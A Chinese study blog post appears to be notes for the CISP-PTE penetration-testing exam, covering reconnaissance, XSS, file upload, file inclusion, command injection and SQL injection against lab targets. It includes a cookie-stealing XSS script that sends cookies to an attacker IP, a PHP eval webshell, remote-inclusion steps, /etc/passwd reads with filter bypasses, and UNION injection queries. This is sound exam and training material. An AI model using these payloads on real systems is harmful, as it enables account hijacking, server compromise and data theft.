---
title: PTE学习笔记
layout: post
tags: CISP
categories: 认证
excerpt: CISP-PTE认证考试一条龙记录
---

靶机：pikachu、  dvwa、upload-labs、xss.haozi.me

环境机房：11.1.10.0/24、10.1.10.0/24

# web安全简介

## 基础术语

1.exp、poc区别：

exp带有恶意行为，发生了攻击的操作；poc只是验证漏洞的存在

2.提权：

www-data > root

webshell > mstsc

## 主流攻击手段

- 应用层:弱口令攻击、配置缺陷、应用漏洞、SQL注入/XSS/CSGF/。。。
- 网络层和主机层：Ddos攻击、远程溢出攻击、ARP欺骗攻击、木马及蠕虫病毒

## 渗透测试过程（七）

- 前期交互阶段：与客户进行交互讨论，确定渗透测试范围、目标、限制条件以及服务合同等细节。 
- 情报收集阶段：利用各种信息来源与搜索技术方法，尝试获取更多关于目标组织网络 拓扑、系统配置与安全防御措施的信息。 
- 威胁建模阶段：在收集到充分的信息进行威胁建模与攻击策划，确定出最可行的攻击通道。
-  漏洞分析阶段：找出可以实施渗透攻击的攻击点，或者针对系统与服务进行安全漏洞 探测与挖掘。
-  渗透攻击阶段：获取访问控制权。
-  后渗透攻击阶段：寻找客户组织最具价值和尝试安全保护的信息和资产，最终达成能够对客户组织造成最重要业务影响的攻击途径。
- 报告阶段：渗透测试的过程详细描述，以及修补与升级技术方案

## OWASP TOP　10

https://blog.csdn.net/qq_52469895/article/details/124289044

# 信息收集

## 目的作用

- 了解安全架构：信息收集使攻击者能够了解组织完整的安全架构 

- 缩小攻击范围：通过IP地址范围、网络、域名、远程访问点等信息，可以缩小攻击范围 

- 建立信息数据库：攻击者能够建立他们自己的相关目标组织安全性弱点的信息数据库来采取下一步的入侵行动 

- 描绘网络拓扑：攻击者可以描绘出目标组织的网络拓扑图，分析最容易进入 的攻击路径 

  信息收集对于渗透来说是非常重要的一步，收集的信息越详细对以后渗透测试的 影响越大，毫不夸张的说，信息的收集决定着渗透的成功与否

## 分类

- 被动信息收集：被动信息收集也就是说不会与目标服务器做直接的交互、在不被目标系统察觉的情况下，通过搜索引擎、社交媒体等方式对目标外 围的信息进行收集，例如：网站的whois信息、DNS信息、管理员以及工 作人员的个人信息等等。 
- 主动信息收集：主动收集会与目标系统有直接的交互，从而得到目标系统相关的一些情报信息。例如：主机开发的端口、站点的目录结构等等。 

## 收集内容

![image-20230828231811864](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20230828231811864.png)

## 方法

1.搜索引擎

 百度、谷歌语法，如：site:edu.cn intext:后台管理、inurl admin

3.人肉搜索     恶俗维基

3.社工库（20-30）

4.网站信息收集     

![image-20230611202209113](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20230611202209113.png)

源码查看：右键”查看网页源代码“

cookie查看：右键”检查“-Application-

5.站长工具

6.邮件信息

![image-20230611203330964](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20230611203330964.png)

7.shodan搜索引擎

用于搜索端口设备等物理层的搜索引擎，基于拦截器，对来自各种设备的HTTP header以及其他标志性信息进行检索，以用来对web服务进行细节分析。

![image-20230828233540879](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20230828233540879.png)

![image-20230828233923911](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20230828233923911.png)

8.Whois信息收集（查询域名）

9.DNS解析记录 

- A    域名指向ip      8023.io     182.47.6.80
- AAAA        域名指向ip      8023.io     2408:8215:b1b::1
- cname   域名指向域名     8023.io     8023.net
- MX       域名指向ip（电邮专用）     8023@8023.io    8023.io       182.47.6.80
- TXT      记录任何事情 （一般用于验证域名所有权） 
- NS      指定域名解析服务器     a.8023.io     11.1.1.1
- PTR    ip指向域名

10.DNS查询

`nslookup  www...域名`

`dig`

11.确定网络地址范围

国内：CNNIC.cn

国外：netcraft    （攻击时建议禁用，因为会对某些恶意url进行禁止访问）

主要查看网站的status、inetnum

> 专线： ASSIGNED NON-PORTABLE    如：IDC机房、企业出口等
>
> 家宽/流量：ALLOCATED PORTABLE （ip段不可利用）

12.社交网站

13.社工

14.指纹识别

常见的CMS：Dedecms（织梦）、**Discuz**、PHPWEB、PHPCMS、**PHP Wind**、ECShop、Dvbbs、SiteWeaver、ASPCMS、帝国、Z-Blog、**WordPress**等

CMS识别工具：御剑、WhatWeb、webRobo、椰树等。

插件：Wappalyzer

15.查找WEB站点真实ip

- 判断目标是否使用了CDN云加速

  - ping主域，通过爆出的IP去直接访问看响应内容或者在微步检索分析
  - 多地点ping
  - 在线网站    www.17ce.com

- 绕过CDN找真ip

  - 查询历史DNS记录       

    -  dnsdb.io      
    - 微步在线

  - 当前MX记录查询（邮件服务器与web服务器托管于相同的ip），或者在相同网段——可结合CNNIC查是否专线来扫描段

  - 查询子域名

    - 微步在线

    - dnsdb.io

    - Google搜索     

      如：site：baidu.com -www

    - 子域名扫描器

  - 网络空间引擎

  - SSL证书寻找真实ip     

    - 搜索框查看——公用名

      查看证书是否有效？颁发者 、详细信息中查看证书链（3-4层）

    - Censys搜索引擎

      有效证书搜索参数：parsed.names:xxx.com and tags.raw:trusted

  - HTTP标头寻找真实ip

    Security Trails、Censys

  - 利用网站返回内容查找

  - 使用国外主机解析域名

  - 网站邮件订阅referer查找

  - Zmap扫全网

  - F5 LTM解码法

    当服务器使用F5LTM做负载均衡时，通过对set-cookie关键字的解码真实ip也可被获取，例如: Set-Cookie:BIGipServerpol 8.29 8030=487098378.24095.0000，先把第一小节的十进制数即487098378取出来，然后将其转为十六进制数1d0888a，接着从后至前，以此取四位数出来也就是0a.88.08.1d，最后依次把他们转为十进制数10.136.8.29，也就是最后的真实ip

- 验证获取到的ip

  直接ip访问来对比页面内容是否一致，访问成功，则一定是真实ip；访问不成功，则不一定 不是真实IP（与备案与否有关，可通过未备案域名cname解析到相应站点，向工信部举报来实施关站攻击。一般通过对host头进行判断是否等于备案域名来允许正常访问，所以访问ip不成功并不能验证该ip是否为真实ip）

16.收集敏感目录文件

DirBuster，OWASP ZAP（kali）

# 代理

**功能**：突破自身ip访问限制、访问内部资源、突破运营商IP封锁、提高访问速度、隐藏真实ip

**方式**：

HTTP代理: 4层或以上数据，http、ftp等等 

socks代理: 3层或以上数据，http、ftp、tcp、udp等(网游加速器、翻墙软件)

VPN代理: 2层或以上数据，ICMP、ARP全协议等(真题环境openvpn)

- TUN模式
- TAP模式

**利用**：

1. 隐藏源地址，所以攻击可以在无任何法律论据的情况下入侵； 
2. 通过冒充一个代理的源地址来掩盖实际的攻击地址； 【Tor】
3. 远程访问内网和其他通常禁止访问的网页资源； 
4. 拦截所有攻击者发送的请求并将其它们转换为第三个目标，因此受害者将只能识别代理服务器地址； 
5. 攻击者将多个代理服务器链接起来以避免被探测到。【Tor】

# 漏洞扫描

### 主机扫描

namp扫描——判断存活主机

- 指定ping包个数
  - windows       Ping –n 2 200.200.0.20 
  - Linux              Ping –c 2 200.200.0.20 

- 不间断发送ping包 Ping – t 200.200.0.20 

- 指定ping包字节大小 Ping –l 1000 200.200.0.20

namp——主机存活批量扫描（ping扫射）

原理：客户端对每个ip做出ICMP echo request请求，存活主机作出ICMP echo reply回应，服务端完成统计

```
namp -sn   200.200.0.20
namp -sn   200.200.0.20-29
namp -sn   200.200.0.0/24
```

### 端口扫描

#### 端口分类

1.公认端口

   • 0～1023的端口是公认的、知名的端口 ，需要ROOT权限才可以操作

   • 0～255之间的端口由 因特网名称与数字地址 分配机构（ICANN） 管理

2.注册端口

​    主要用于服务器对外提供服务 ， 端口范围：1024～ 49151

3.动态/私有端口

​    用于分配给用户编写的 客户端应用程序 ， 端口范围：49152～ 65535

#### 扫描

```
namp -p 1-65535 -T4 -A -v 11.1.10.11
```

-T4扫描速度，-A全部扫描，-v展示详细信息

### 服务扫描

#### Banner提取

1.CURL   

​       curl --head 域名/ip

2.NetCat

​       nc -vv ip 11.1.10.11 34011

​       GET / HTTP/1.0

3.浏览器访问中，F12在Network中查看响应头

4.NMAP

```
namp -sV -p 34011 11.1.10.12
```

#### 操作系统识别

```
namp -O 11.1.10.11
```

1. **操作系统TTL值不统一** 

   - linux：64

   - windows：128

   - ios：255

     *注：TTL比预期小是因为中间存在路由，一个路由-1*

   ​          企业网不允许私接路由，通常在交换机上设置终端主机TTL为1，加路由后TTL=0，限制转发数据

2. **开放端口差异**

3. **应用服务标识符差异**

### 漏洞扫描

#### 主机层

**Nessus**

**Openvas**(免费但漏洞库更新慢)

#### 网络层

**AVWS**

**AppScan**

web扫描，支持简体中文，一边扫描一边保存，支持断点续扫，支持中文报告

# HTTP协议

## 1.http报文传送

http2.0及以下使用了面向连接的tcp作为传输层协议，保证了数据的可靠传输。http不考虑数据在传输过程中被丢弃后又怎样重传。从层次的角度上看，http是面向事务的应用层协议。

http协议建立前无连接、无状态（无事务处理记忆）

http/1.1，持续连接（非流水线和流水线方式）

## 2.http报文

![抓包详解](https://gitee.com/Wizo142857/cloudimages/raw/master/img/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3.jpg)

![image-20230611093442066](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20230611093442066.png)

CR——回车0d        光标回退到本行最前

LF——换行0a         光标跳转到下行最前

### 2.1请求报文方法

![image-20230611093228075](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20230611093228075.png)

**GET与POST区别**

get回退无害，post则需再次提交表单；

GET请求只能进行url编码，而POST支持多种编码方式。

如果需要传送大量数据的时候，不适合使用GET方式。

GET产生一个TCP数据包；POST产生两个TCP数据包。对于GET方式的请求，浏览器会把http  header和data一并发送出去，服务器响应200 （返回数据）； 而对于POST，浏览器先发送header，服务器响应100 continue，浏览器再发送data，服务器响应200 ok（返回数据）。

### 2.2HTTP请求方法

- GET：GET方法用于获取请求页面的指定信息。如果请求资源为动态脚本（非 HTML），那么返回文本是Web容器解析后的HTML源代码。GET请求没有消息主体，因此在消息头后的空白行是没有其他数据。
-  POST：POST方法也与GET方法相似，但最大的区别在于，GET方法没有请求内容， 而POST是有请求内容的。 
- HEAD：这个请求的功能与GET请求相似，不同之处在于服务器不会再其响应中 返回消息主体，因此，这种方法可用于检查某一资源在向其提交GET请求前是否 存在。 
- PUT：PUT方法用于请求服务器把请求中的实体存储在请求资源下，如果请求资源已经在服务器中存在，那么将会用此请求中的数据替换原先的数据。向服务 器上传指定的资源。

### 2.3HTTP状态码

[HTTP 状态码 | 菜鸟教程 (runoob.com)](https://www.runoob.com/http/http-status-codes.html)

![报文状态码](https://gitee.com/Wizo142857/cloudimages/raw/master/img/%E6%8A%A5%E6%96%87%E7%8A%B6%E6%80%81%E7%A0%81.jpg)

## 3.URI

统一资源标识符（编号方式，类似身份证号码）

3.1 **URL**

统一资源定位，并且表示全球唯一路径（定位方式）

![image-20230611100114271](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20230611100114271.png)

3.2 **URN**

统一资源命名，是通过名字来标识资源，给每个文件进行编号

如：![image-20230611100322689](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20230611100322689.png)

## 4.Cookie

Cookie表示http服务器和客户之间传递的状态信息，用来识别用户身份。

劣势：（存在客户端）可篡改、（多cookie）加重网络负担

**cookie与session区别：**

Cookie保存在客户端浏览器中，而Session保存在服务器上。

Cookie表示http服务器和客户之间传递的状态信息，用来跟踪用户会话。cookie里面包含sessid，相当于session的索引，cookie等同与session ID 【cookie信息不会被清除】；

Session用于在用户身份验证后跟踪用户行为轨迹【session会定时失效】

cookie”客户通行证确认“；session”客户明细表确认“

## 5.危险头部参数

- User-Agent：中文名为用户代理，简称 UA，它是一个特殊字符 串头，使得服务器能够识别客户使用的操作系统及版本、CPU  类型、浏览器及版本、浏览器渲染引擎、浏览器语言、浏览器插件等。一些网站常常通过判断 UA 来给不同的操作系统、不同的浏览器发送不同的页面，因此可能造成某些页面无法在某 个浏览器中正常显示，但通过伪装UA可以绕过检测。 
- X-Forwarded-For：简称XFF头，它代表客户端，也就是HTTP的请 求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时 才会添加该项。格式为：X-Forwarded-For: client1, proxy1, proxy2。 XFF 的内容由「英文逗号 + 空格」隔开的多个部分组成，最开始的是离服务端最远的设备 IP，然后是每一级代理设备的 IP。
-  Referer：网站来路。HTTP Referer是header的一部分，当浏览器 向web服务器发出请求的时候，一般会带上Referer,告诉服务器 用户从哪那个页面连接过来的，服务器由此可以获得一些信息用来处理
-  Cookie：客户端发回给服务器证明用户状态的信息（头：值成对出现） 
-   Host：基于host头进行安全限制很容易被修改绕过
-  Set-Cookie：服务器发给客户端的SessionID （存在被窃取的风险，可 冒充别人身份） 
- Content-Length：响应body部分的字节长度【用于模糊测试】 • Location：重定向用户到另一个页面，可识别身份认证后允许访问的 页面

## 6.HTTP消息头

![消息头](https://gitee.com/Wizo142857/cloudimages/raw/master/img/%E6%B6%88%E6%81%AF%E5%A4%B4.jpg)

**常见请求头**

① Host 请求报头域主要用于指定被请求资源的Internet主机和端口。

② User-Agent 请求报头域允许客户端将它的操作系统、浏览器和其他属性告诉服 务器。 

③ Referer 包含一个URL，代表当前访问URL的上一个URL，也就是说，用户是从什 么地方来到本页面。当前请求的原始URL地址。 

④ Cookie 是非常重要的请求头，常用来表示请求者的身份等。 

⑤ Accept 这个消息头用于告诉服务器客户端愿意接受哪那些内容，比如图像类， 办公文档格式等等。

**常见响应头**

 ① Server 服务器使用的Web服务器名称。

 ② Location 服务器通过这个头告诉浏览器去访问哪个页面，浏览器接收到这个请求 之后，通常会立刻访问Location头所指向的页面。用于在重定向响应中说明重定 向的目标地址。

 ③ Content-Type 这个消息头用于规定主体的内容类型。例如，HTML文档的内容类 型text/html。

 ④ Content-Encoding 这个消息头为消息主体中的内容指定编码形式，一些应用程序 使用它来压缩响应以加快传输速度。

 ⑤ Content-Length 消息头规定消息主体的字节长度。实体头用于指明实体正文的长 度，以字节方式存储的十进制数字来表示。

 ⑥ Connection 允许发送指定连接的选项。

**拦截http请求**

![image-20230611104718352](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20230611104718352.png)

# 暴力破解

暴力破解也被称为枚举测试、穷举法测试，是一种针对密码破译的 方法，即：将密码逐个比较，直到找出真正的密码为止。(弱口令扫描 也属于此类范畴)

## burpsuit抓包

- burp抓包注意项

> 关闭 firefox多余的联网检测包：
>
> ```
> 新的标签页搜索框输入about:config——captive——双击true改为flase
> ```

- burp配置浏览器代理

浏览器插件/系统代理（手动配置且”不使用代理清空“）

注：二者不可都配置

## 分类

**C/S架构**

- Hydra九头蛇  、   hashcat（前提是通过抓包获取密文，在本地爆破）可通过显卡来跑

**B/S架构**

Burpsuit的Intruder模块

攻击类型：

- sniper：一个变量 一个字典  ，爆破路径、指定用户名的密码

- battering ram：一个字典  两个参数

- pitchfork：两个字典  两个参数  同行匹配   一一对应（常用于撞库）  

  ```
             a1 b2 c3
  ```

- cluster bomb： 两个字典   两个参数    排列组合，穷举所有可能交叉破解

```
              a1 b1 c1

              a2 b2 c2

              a3 b3 c3
```



## 靶机演示

[ 暴力破解浅析_歪曌的博客-CSDN博客](https://blog.csdn.net/weixin_42596710/article/details/131166007?spm=1001.2014.3001.5502)

## 防止暴力破解

1.密码复杂性

2.验证码

3.登录策略（限制登录错误次数）

# 验证码爆破

服务器验证码漏洞

1.验证码的时效性

2.空的身份认证信息

![image-20240103153155483](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20240103153155483.png)

抓包发送至攻击器

![image-20240103153406967](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20240103153406967.png)

**删cookie、删code（即sessionid=空  code=空 ），只保留password变量**

进行爆破

# XSS

## 原理

形成XSS漏洞的主要原因是程序中输入和输出的控制不够严格， 使得攻击者可以通过“精心构造” 的脚本输入后，在输出到前端时被浏览器当作有效代码解析执行。

XSS漏洞可以用来进行钓鱼攻击、前端js挖矿、盗取用户cookie，甚至对主机进行远程控制，是代码注入漏洞的一种。

## 攻击流程

![image-20230612224500493](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20230612224500493.png)

## XSS恶意脚本形式

1. 利用XSS弹警告框：

`<script>alert(‘xss’)</script>`

2. 获取cookie值：

`<script>alert(document.cookie)</script>`

3. 点击触发超链接

    `<a href=javascript:alert(111)>`

4. body体执行完之后加载....

   `<body onload=alert(1)>`

5. `<img src=x onerror=alert(1)>`

   x为url，img标签向x发送一个GET请求并将请求结果当作图片来展示；url执行不成功则执行后面的onerror方法

6. 点击块执行

   `<div onclick="alert=('xss')">`

7. 嵌入其他网站：

`<iframe src="http://www.xxxxx.com" width="0" height="0"></iframe>`

8. XSS输入也可能是HTML代码段，如使网页不停刷新：

`<meta http-equiv="refresh" content="0;">`


## 攻击类型

### 存储型

攻击方式：这种攻击多见于论坛、博客和留言板，攻击者在发帖的过程中，将恶意脚 本连同正常信息一起注入帖子的内容中。随着贴子被服务器存储下来，恶意脚本也永 久的存放在服务器后端存储器当中了。当其它用户浏览这个被注入了恶意脚本的帖子 时，恶意脚本会在他们的浏览器中得到执行。

**特点**：交互的数据会被存在数据库里面，永久性存储，一般出现在留言板，注册等页面

### 反射型

攻击方式：攻击者通过电子邮件等方式将包含XSS代码的恶意链接发送给受害者，当受 害者访问链接时，服务器接收此受害者的请求并进行处理，然后服务器把带有XSS代码 的数据发给受害者的浏览器，浏览器解析这段带有XSS代码的恶意脚本后，就会触发 XSS漏洞。

**特点**：交互的数据一般不会被存在数据库里面，一次性，所见即所得，一般出现在查询页面等

### DOM型

DOM XSS是页面中原有的JS代码执行后，需要进行DOM树节点的增加 或者对现有元素的内容进行修改，引入了被污染的变量，从而导致XSS。

**特点**：不与后台服务器产生数据交互，是一种通过DOM操作前端代码输出的时候产生的问题。服务端函数**document.body.innerHtml**等函数（既有输入，也有输出）引用某些变量时没有进行过滤或检查，就会产生DOM型XSS。

关于DOM

DOM的全称为Document Object Model，即文档对象模型，DOM通常用于代表在 HTML、XHTML和XML中的对象。使用DOM可以允许程序和脚本动态地访问和更新文档 的内容、结构和样式。根据DOM规定，HTML文档中的每个成 分都是一个节点。

## 危害

① 网络钓鱼，包括盗取各类用户账号 

② 窃取用户cookie资料，从而获取用户隐私信息，或利用用户身份进一步对网站执行操作 

③ 劫持用户（浏览器）会话，从而执行任意操作，例如进行非法转账，强制发表日志，发送 电子邮件等 

④ 强制弹出广告页面，刷流量等 

⑤ 网页挂马 

⑥ 进行恶意操作，例如任意篡改页面信息，删除文章等 

⑦ 进行大量的客户端攻击，如DDOS攻击 

⑧ 获取客户端信息，例如用户的浏览历史，真实ip，开放端口等 

⑨ 控制受害者机器向其他网站发起攻击 

⑩ 结合其他漏洞进一步扩大攻击 

⑪ 提升用户权限，包括进一步渗透网站 

⑫ 传播XSS跨站脚本蠕虫等

## 测试流程

**手工**

1.可得知输出位置时

① 在目标上找输入点，比如查询接口、留言板 

② 输入一组 “特殊字符（>，‘，”等）+唯一识别字符” ， 点击提交后，查看返回源码，看后端返回的数据(输出点)是 否有处理（过滤、转义等） 

③ 通过搜索定位到唯一字符，结合唯一字符前后语法确定 是否可以构造执行js的条件（构造闭合\构造payload）目的 只有一个：让输入的数据（从属性或者标签当中逃逸出来） 变成代码来执行 

④ 提交构造的脚本代码（以及各种绕过姿势），看是否可 以成功执行，如果成功执行则说明存在XSS漏洞

2.无法得知输出位置时

通常可以采用" " />XSS来测试

**工具**

appscan、awvs、burpsuit

## 防御原则

输入过滤，输出转义。

方法：

HttpOnly cookie——不允许通过javascript语句获取cookie

特定标签过滤、事件过滤、敏感关键字（字符）过滤等，同时浏览器也会对XSS漏洞的利用进行限制（ XSS Auditor 、CSP内容安全策略等）。

过滤特殊符号，如<> '' "" () 空格等等，进行转义。

定制CSP（内容安全策略），采用黑名单或白名单加载或执行

规范web安全编码，输出内容进行HTML实体转义或JS转义。

## xss构造

firefox须关闭Nctcraft组件！！！

### GET型XSS反射、存储

`<script>alert(1);</script>`  
#注意输入的长度限制，可以通过前端来更改表单

提交之后可以通过直接复制url去达到目的

### POST型XSS反射

测验与GET提交一样，登录之后提交就可在本地验证

实际利用：

构造一个点击请求触发的页面

```html
<html>
    <head>
        <script>
            window.onload=()=>{
               document.getElementById("submit").click();
               //获取“submit”元素ID进行点击
            };
            //设置载入成功之后进行点击
        </script>  
        <!--script用来生成自动提交-->
    </head>
    <body>
        <from method="post" action="url" hidden>
       <!--action设置提交的位置（即需要触发的页面），防止自提交页面的死循环；并hidden隐藏提交表单-->
            <input class="xssr_in" name="message" type="text" value="<scrpit>alert(1);</script>">  
            <!--value用来自动赋值给提交框“text”内容-->
            <input id="submit" class="xssr_submit" name="submit" type="submit" value="submit">
        </from>   
        <!--from表单是要攻击页面的输入与提交框表单，右键查看元素可获取-->
    </body>
</html>
```

### XSS测试平台

 https://xss.yt

beef(须部署kali公网地址)

https://xss.haozi.me

### **手动构造

伪造cookie信息进行登录的实现：

#### 1.构造js脚本获取cookie

第一步：**获取cookie**

控制台获取document.cookie

第二步：**发送cookie**

![image-20230612092232975](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20230612092232975.png)

`<script>
	document.write(	
		'<img src="http://11.1.12.101:8011/?'+
		 document.cookie+
		'"/>'	
	//利用img标签特性，生成src的GET请求并获取请求页面cookie，然后作为图片去展示；	
	);
//通过document.write写到网页中来-执行img标签-去触发指令-生成一个含cookie的GET请求
</script>`

<!--因为src=“”中引号内容只会作为数据字符串进行展示，所以需引进script脚本去执行document.cookie。对标签和执行内容进行‘单引号’分隔和【数据+指令+数据】的拼接-->

<!--此处的ip地址应是能接受cookie的服务器地址，比如此处vpn分配给本机的ip-->

原理：构造一个访问请求来盗取浏览器页面的cookie

第三步：**接收cookie**

攻击机：接收

shift+右键“在此处打开命令行窗口”，进行端口监听

```
nc  -lp  8011
```

注：**端口号须一致**

​        **监听成功的数据包useagent有“PhantomJS”浏览器指纹（仅限于考试环境）**

#### 2.替换cookie实现登录

- 复制nc监听到的GET数据包cookie，替换到要绕过的登录页面

  chrom：右键检查——Application——修改sessionid

  firefox：小画板search——修改sessionid

- 然后地址栏访问主页面（不是刷新登录页面），eg: 127.0.0.1:8082

#### 3.实施过程

[XSS cookie伪造攻击 - Dawns_- - 博客园 (cnblogs.com)](https://www.cnblogs.com/Seadawns/p/17477437.html)

# 文件上传

## 原理

通常是由于对上传文件的类型、内容没有进行严格的过滤、检查或者过滤被成功绕过，使得攻击者可以通过上传木马获取服务器的webshell权限。

## 绕过方式

### 基于前端校验的上传

关闭js插件绕过文件后缀校验，上传.php文件

`<?php phpinfo();?>`

### MIME类型校验

Content_Type——http包

$_FILES [' '] ['type']——php

**phpinfo 可以输出php的环境信息，其中document_root为web网站目录的绝对路径**

## 实施利用

- 一句话木马文件+hackbar插件实现webshell命令操作

  ```
  <?php @eval($_POST['x']);?>
  
    //eval把（）中的内容当作PHP脚本去解析并执行
  
    //$_POST[]是用户提交的数据
  
    //@是关闭错误输出
   
  ```

  ![image-20230614162431471](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20230614162431471.png)

- 一句话木马文件+webshell工具

  蚁剑、菜刀、冰蝎

  ![image-20230614163414812](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20230614163414812.png)

# 文件包含

1.考试类型

picshell.php

2.考察

**(对关键字双写或大小写绕过)**

## 文件包含过滤手法

- /etc/passwd    C:\Windows\win.ini
- file=../../../../../../etc/passwd
- file=upload/2220230829135924.jpg         

​         

- file=picshell.jpg                          //直接包含

- file=....//....//picshell.jpg              //目录穿越

- file=filexxx/../../../hackable/uploads/picshell.jpg              //构造不存在的目录进行回退包含

- file=file:///C:/phpstudy_pro/WWW/dvwa/hackable/uploads/picshell.jpg         // file协议后跟绝对路径  

- file=php://input    [post data] 中写入   <?php phpinfo(); ?>           //将post表单中的内容当作文件内容进行包含

  **有后缀的突破：**

- file=data://text/plan,<?php @eval($_POST['x']); ?>               //将逗号之后的内容当作文件内容进行包含（当包含在末尾添加后缀的情况，如include{$_GET[file].".txt"}每次都会在包含文件后添加后缀）

- file=data://text/plan;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==

- 远程文件包含

  1.攻击机桌面创建shell.php文件

  2.本地桌面启动命令行进行端口监听

  ```
  python -m SimpleHTTPServer 8023 
  python -m http.server 8023      //二选一
  ```

  3.访问(攻击者)桌面本地shell文件

  file=http://11.1.10.250:8023/shell.php    

  4.蚁剑连接

- file=php://filter/read=convert.base64-encode/resource=fi_remote.php      //**读文件源码**（key作为注释或者变量被执行输出结果而不可见的情况）





- file=zip://shell.zip#shell.txt                  //包含压缩包内容

  #在url中表示锚点，后面的内容不传输到服务器，所以需要对#URL编码为%23

  

- include('ssssss' . $_GET['x']);

- include($_GET['x'] . '.txt');          //远程包含

# 解析漏洞

![中间件解析漏洞](https://gitee.com/Wizo142857/cloudimages/raw/master/img/%E4%B8%AD%E9%97%B4%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E.png)

# RCE

## 连接符

`|   ||    &     &&      ；`

## 读文件

【考点】grep、diff

```
cat /etc/passwd   顺序读取
tac /etc/passwd   倒序读取
head /etc/passwd
tail /etc/passwd
more /etc/passwd
less /etc/passwd
grep '' /etc/passwd          grep . /etc/passwd     过滤输出
awk {print} /etc/passwd     按照指定格式解析输出或者指定某几行输出
sed '' /etc/passwd      修改文件内容
cp /etc/passwd /dev/stdout    复制
diff /etc/passwd /etc/hostname   对比
xxd /etc/passwd    输出二进制
od -a /etc/passwd    二进制
nl /etc/passwd    带行号输出
sort /etc/passwd  排序
uniq /etc/passwd
base64 /etc/passwd  绕过输出的内容（关键字）过滤
curl file：////etc/passwd
```

## 空格过滤

cat$IFS$9/etc/passwd

cat${IFS}/etc/passwd

cat</etc/passwd

cat<>/etc/passwd

{cat,/etc/passwd}

f=$'\x20/etc/passwd'&&cat$f

## 指令关键字过滤

c''at /etc/passwd             （此处为一对单引号）

ca\t /etc/passwd

## 文件名关键字过滤

cat /etc/passw*       通配符

## 替换为空

cacatt /etc/passwd

## 防范方式

1.尽量不要使用命令执行函数

2.在进入执行命令函数/方法之前，变量做好过滤，对敏感字符转义

3.在使用动态函数之前，确保使用的函数是指定的函数之一

4.客户端提交的变量在进入执行命令函数之前要做好过滤和检测



# SQL注入

## SQL语言

结构化查询语言

六大部分：

## 定义

通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。 

具体来说，它是利用现有应用程序，将（恶意）的SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一 个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句

## 成因

未对用户提交的参数数据进行校验或过滤，直接进行SQL语句拼接，改变了原有SQL语句的语义，传入数据库解析引擎中执行。

## 注入场景

一切用户可控参数的地方，比如：URL路径、GET/POST请求参数、HTTP请求头

![image-20230617180709340](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20230617180709340.png)

## information_schema（Mysql>5.0）

如MySQL数据库中系统自带的information_schema信息 数据库中保存着关于MySQL服务器所维护的所有其他 数据库的信息，当前MySQL实例中所有数据库的信息 存放在SCHEMATA表，所有表信息存放在TABLES表中， 所有表中列（字段、表名）信息存放在COLUMNS表中。

![image-20230617175944587](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20230617175944587.png)

## 数据库注释语法

SQL Server和Oracle 

```
--       用于单行注释 

/* */    用于多行注释
```

Mysql 

```
--%20     用于单行注释 (要求第二个-后面跟一个空格或控制字符，如制表符，换行符等) 
#         用于单行注释 
/* */     用于多行注释
```

## 手工注入

**注入点**   

sql查询语句的参数在哪个页面输入

**执行点**   

sql查询语句在哪个页面中拼接并执行

**回显点**   

sql查询语句执行的结果在哪个页面显示

### SELECT注入 

1.寻找注入点      get、post表单 

2.触发异常，确认注入点    

```
%'"）;-- #

% 闭合模糊查询（搜索型）
) 闭合insert语句
-- 和#  用来注释后面的语句
```

  用以上字段带入去触发回显，筛选适用的符号注入

^3.找前后闭合（区分类型）

 前闭合：

```
'      "       ')      ")      %'      %"     %')       %")       无闭合
```

后闭合：

```
'      "       ('      ("      '%      "%     ('%      ("%        #        --空
```

通过猜测和报错去尝试

**常用闭合符号：查询   '  "           插入    ')      ")          模糊查询   %'        其他情况    #   --空**

^4.执行测试（确定闭合）  

在前闭合或后闭合之间插入测试语句，对比两次执行结果，有报错即语句被执行，与数据库有交互。

1 and 1=1      执行结果为真恒等 

1 and 1=2      执行结果为假恒等

5.确定列数

```
1 order by  *  
```

​    *代入数字，由范围排序的报错来定位出具体列数 （二分法）

*注：空格被过滤，可以用/**/来过滤*

6.确定回显点

```
id=-1 union select 1,2 
```

select 后面的1，2意思是输出一个一行两列的数据；

union select 需要前后查询的字段数一致，通过order by来确定；

 **id=-1是因为大多网站只显示查询到的第一行数据，改为-1让默认语句查不到数据，进而输出自定义的select数据；**

7.获取数据库名

```
-1 union select 1,database()
```

8.获取表名

```
-1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='pikachu')
```

group_concat是将多个表名打包成一个数据来输出

9.获取列名

```
-1 union select 1,(select group_concat(column_name) from information_schema.columns where table_name='users')
```

10.获取数据

```
-1 union select 1,(select group_concat(usermane,':',password separator '</br>') from users)
```

':'     分隔符

separator `'</br>'    `   每行数据换行符

#### 插件辅助

获取表名

Firofox——UNION BASED——Tables

获取字段……Cloumns

获取数据……Data

注意：post请求中，自动生成的查询语句会使用URL编码【+或%20】来替换空格进行串联，但是实际中post不用替换空格，需要手动改回空格。适用于get请求。

#### 思路

1.不用注释

找前闭合或者后闭合，尝试用union select ‘’去判断回显

2.绕过注释

注释符交叉复写，如-#- 

并对注释符进行必要的URL编码，如-%23-%20

## SQLMAP注入

sqlmap.py 

- 指定攻击目标

